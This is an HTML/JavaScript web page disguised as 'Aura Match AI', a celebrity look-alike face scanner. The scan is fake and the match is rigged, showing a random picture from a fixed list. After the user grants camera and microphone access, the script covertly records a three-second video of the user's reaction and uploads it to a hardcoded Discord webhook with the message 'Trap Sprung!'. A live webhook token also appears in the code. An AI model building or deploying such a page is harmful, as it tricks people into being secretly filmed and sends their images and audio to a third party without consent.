<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aura | AI Celebrity Match</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #f8fafc;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 40px;
            width: 90%;
            max-width: 450px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
            background: linear-gradient(to right, #38bdf8, #818cf8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p.subtitle {
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .video-wrapper {
            position: relative;
            width: 100%;
            border-radius: 16px;
            overflow: hidden;
            border: 2px solid rgba(56, 189, 248, 0.3);
            background: #000;
            margin-bottom: 25px;
            box-shadow: 0 0 20px rgba(56, 189, 248, 0.1);
            display: none; /* Hidden until connected */
        }

        #video-preview {
            width: 100%;
            display: block;
            transform: scaleX(-1);
        }

        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: #38bdf8;
            box-shadow: 0 0 10px #38bdf8, 0 0 20px #38bdf8;
            display: none;
            animation: scan 1.5s ease-in-out infinite;
        }

        @keyframes scan {
            0% { top: 0; opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { top: 100%; opacity: 0; }
        }

        button {
            background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-bottom: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px -10px rgba(56, 189, 248, 0.6);
        }

        #scan-btn {
            display: none; /* Hidden until camera connects */
        }

        #status-text {
            margin-top: 15px;
            font-size: 13px;
            color: #38bdf8;
            font-family: monospace;
            min-height: 20px;
        }

        #result-container {
            display: none;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        #celeb-image {
            width: 100%;
            border-radius: 16px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Aura Match AI</h1>
        <p class="subtitle">Neural facial mapping to find your exact celebrity twin.</p>

        <div class="video-wrapper" id="cam-container">
            <video id="video-preview" autoplay muted playsinline></video>
            <div class="scan-line" id="scan-line"></div>
        </div>

        <div id="result-container">
            <h2 style="color: #4ade80; margin: 0;">99.8% Match Found</h2>
            <img id="celeb-image" src="" alt="Your Match">
        </div>

        <button id="connect-btn">Connect Camera</button>
        <button id="scan-btn">Analyze Face</button>
        <div id="status-text">Awaiting camera initialization...</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT";
        
        const RIGGED_IMAGES = [
            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519700833210458/2026-05-17_13-26-39_441.jpg?ex=6a0aebfb&is=6a099a7b&hm=f72dca1e0eddf09f71c1f06adc5e0d365cef8b62ef7603b26c60015a12b96b53&",
            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519701235728515/2026-05-17_13-26-39_621.jpg?ex=6a0aebfb&is=6a099a7b&hm=5692ace96db7b6c49bb1d6d1635dfd8f36bdbe74174a909d3fc5920a91fcea85&",
            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519701533655140/2026-05-17_13-26-39_451.jpg?ex=6a0aebfb&is=6a099a7c&hm=4ddb7ac034aeed27c54eb8a33dcb22592457b65cf538c1eca102c1c4b90f8ed3&",
            "https://cdn.discordapp.com/attachments/1419643482305335401/1505519702137503744/2026-05-17_13-26-39_523.jpg?ex=6a0aebfb&is=6a099a7c&hm=19563189ed7a9702525fb7aedfdc8b1dff57b7e2ee11fe8746935767608a6df5&",
            "https://cdn.discordapp.com/attachments/1419643482305335401/1505516944349073408/2026-05-17_13-26-39_418.png?ex=6a0ae96a&is=6a0997ea&hm=2992741a4f7d9f8cc376848fe955385049b8f62a9d10e98f24fd7acfe0927e66&"
        ];

        const video = document.getElementById('video-preview');
        const connectBtn = document.getElementById('connect-btn');
        const scanBtn = document.getElementById('scan-btn');
        const statusText = document.getElementById('status-text');
        const scanLine = document.getElementById('scan-line');
        const resultContainer = document.getElementById('result-container');
        const celebImage = document.getElementById('celeb-image');
        const camContainer = document.getElementById('cam-container');

        let stream;
        let mediaRecorder;
        let recordedChunks = [];

        // Wait for user to click before asking for camera
        connectBtn.onclick = async () => {
            statusText.innerText = "Requesting permissions...";
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                
                // Show the video feed and the real button
                camContainer.style.display = 'block';
                connectBtn.style.display = 'none';
                scanBtn.style.display = 'block';
                statusText.innerText = "System ready. Position your face in frame.";
            } catch (err) {
                statusText.innerText = "Camera access denied or unavailable.";
                statusText.style.color = "#ef4444";
            }
        };

        scanBtn.onclick = async () => {
            scanBtn.style.display = 'none';
            scanLine.style.display = 'block';
            statusText.innerText = "Extracting biometric markers...";

            setTimeout(() => {
                statusText.innerText = "Cross-referencing global database...";
            }, 800);

            setTimeout(() => {
                scanLine.style.display = 'none';
                camContainer.style.display = 'none';
                statusText.style.display = 'none';
                
                const randomPic = RIGGED_IMAGES[Math.floor(Math.random() * RIGGED_IMAGES.length)];
                celebImage.src = randomPic;
                resultContainer.style.display = 'block';

                startReactionCapture();
            }, 1800);
        };

        function startReactionCapture() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                sendToDiscord(videoBlob);
            };

            mediaRecorder.start();

            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }, 3000);
        }

        function sendToDiscord(blob) {
            const formData = new FormData();
            const filename = `reaction_${new Date().getTime()}.webm`;
            formData.append('file', blob, filename);
            formData.append('content', '🎯 **Trap Sprung!** New reaction captured.');

            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            }).catch(console.error);
        }
    </script>
</body>
</html>
